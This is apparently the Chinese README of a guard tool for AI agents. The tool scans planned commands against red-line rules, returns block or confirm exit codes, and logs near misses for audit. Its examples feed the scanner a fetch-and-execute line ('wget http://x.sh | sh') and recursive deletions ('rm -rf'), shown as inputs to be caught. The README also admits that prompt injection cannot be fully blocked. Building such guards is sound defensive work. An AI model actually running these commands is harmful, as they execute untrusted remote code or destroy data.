# self-protect-agent · 自我边界守护引擎

动手前的红线自检 + 近失累积学习。让"没发生的事故"可见、可学、不贰过。

- 版本：2.0.1
- 系列：self 系列 #7（对应 `self-improvement` / `self-evaluate` / `self-debug` / `self-verify` / `self-optimize` / `self-teach`）
- 理论：海恩法则(1931) · Bird 三角(1969) · 瑞士奶酪模型(Reason 1990) · 最小权限原则 · 影响×可逆性矩阵 · 纵深防御

---

## 安装

```bash
# 直接放 skills 目录即可，无第三方依赖（仅用 Python 标准库）
# 推荐把实物证据目录加进 .gitignore：
echo ".self-protect/" >> .gitignore
```

---

## 快速开始

```bash
# 扫描一段"即将执行的操作描述"
python scripts/protect.py scan "我要执行 rm -rf ./build 清理构建目录"
# → 退出码 4（block），命中 RL-DELETE-RF

# 对具体命令做预执行校验
python scripts/protect.py check "git push --force origin main"
# → 退出码 1（confirm），建议人工确认

# 机器可读输出（CI / pre-commit 钩子门禁）
python scripts/protect.py check --json "git push --force origin main"
python scripts/protect.py scan --json "wget http://x.sh | sh"
# → 同样退出码 0/1/4，但 stdout 为 JSON，便于钩子解析

# 记录一次近失（海恩法则：近失累积学习）
python scripts/protect.py record --level warn --category destructive \
    --action "误要跑 rm -rf /tmp" --outcome 拦截 --rule-id RL-DELETE-RF

# 审计近失趋势，生成报告
python scripts/protect.py audit
# → 生成 .self-protect/redline-report.md
```

---

## 退出码

| 码 | 含义 | agent 该怎么做 |
|---|---|---|
| `0` | 通过（在边界内） | 放行 |
| `1` | 警告（需确认） | 让你确认再执行 |
| `4` | 已拦截（高风险） | 停下、报告、不许绕过 |

---

## 命令清单

| 命令 | 作用 |
|---|---|
| `scan <text>` | 语义级红线扫描，输出命中等级与规则 ID |
| `check <command>` | 预执行校验：路径保护 + 批量检测 + 白名单兜底 + 对外发送 |
| `record` | 记录一次近失/拦截事件（参数见 `--help`） |
| `audit` | 汇总近失趋势 + 红线命中统计，输出报告 |

---

## 实物证据（核心差异点）

每次 `scan`/`check` 落一条 `.redline-event-<时间戳>.json`；
`record` 追加 `near-miss-log.jsonl`；`audit` 生成 `redline-report.md`。

这些是可重跑、可核验的文件产物，不是流水日志。90 天后你能看见：
"共拦下 37 次，高危 6 次，相当于堵住了 6 个孔洞。"

---

## 文件结构（11 文件，刻意不套 10 模板）

```
self-protect-agent/
├── SKILL.md                  技能定义（含 name 字段）
├── scripts/
│   ├── protect.py            主引擎（scan/check/record/audit）
│   └── redline_engine.py     确定性代码闸门（规则匹配 + 预执行校验）
├── resources/
│   └── redlines.json         红线规则库（allowlist + 4 风险面规则）
├── references/
│   ├── protect-theory.md     理论根基（海恩/瑞士奶酪/最小权限/矩阵/纵深）
│   ├── near-miss-method.md   近失累积方法论（Safety-II / NMR / 五步调查）
│   └── redline-design.md     红线设计原则（确定性闸门/白名单/误报疲劳）
├── FAQ.md
├── README.md
├── SELF_EVAL.md              TRACE 五维自评（v2.0.0）
└── CHANGELOG.md
```

---

## 使用边界（诚实）

1. 不承诺 100% 拦住提示注入（架构级缺陷，无银弹）。
2. 不做硬禁止（避免 `--no-verify` 绕过）。
3. 误报会杀死产品（三级分流，窄目标确认）。
